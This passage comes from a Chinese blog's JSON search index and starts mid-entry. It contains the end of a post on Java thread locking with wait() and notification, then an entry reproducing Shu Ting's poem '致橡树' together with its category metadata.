使用wait之后发现r2抢到了a锁和b锁，释放了b锁但r1没有继续进行，而此时程序也没有正常退出。是因为r1线程进入了等待队列，还没有被唤醒。在r2完成之后去唤醒r1就能使r1进入b锁","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"致橡树","slug":"诗/致橡树","date":"2018-12-18T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/26be181c.html","link":"","permalink":"http://example.com/article/26be181c.html","excerpt":"","text":"致橡树​ 舒婷 我如果爱你——绝不像攀援的凌霄花，借你的高枝炫耀自己；我如果爱你——绝不学痴情的鸟儿，为绿荫重复单调的歌曲；也不止像泉源，常年送来清凉的慰藉；也不止像险峰，增加你的高度，衬托你的威仪。甚至日光，甚至春雨。 不，这些都还不够！我必须是你近旁的一株木棉，作为树的形象和你站在一起。根，紧握在地下；叶，相触在云里。每一阵风过，我们都互相致意，但没有人，听懂我们的言语。你有你的铜枝铁干，像刀，像剑，也像戟；我有我红硕的花朵，像沉重的叹息，又像英勇的火炬。 我们分担寒潮、风雷、霹雳；我们共享雾霭、流岚、虹霓。仿佛永远分离，却又终身相依。这才是伟大的爱情，坚贞就在这里：爱——不仅爱你伟岸的身躯，也爱你坚持的位置，足下的土地。","categories":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}],"tags":[],"keywords":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}]}]}